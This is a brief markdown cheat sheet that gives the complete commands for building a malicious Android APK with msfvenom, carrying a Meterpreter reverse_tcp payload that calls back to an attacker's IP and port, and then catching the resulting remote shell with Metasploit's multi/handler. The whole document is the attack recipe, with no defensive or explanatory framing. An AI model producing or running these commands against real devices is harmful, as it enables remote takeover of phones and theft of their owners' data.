### create reverse shell by msfvenom
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=[Attacker's IP] LPORT=[PORT] R > [APK Filename] 
```
​
### connect reverse shell
```
msfconsole

use exploit/multi/handler

set PAYLOAD android/meterpreter/reverse_tcp

set LHOST [Attacker's IP]

set LPORT [PORT]

exploit
```
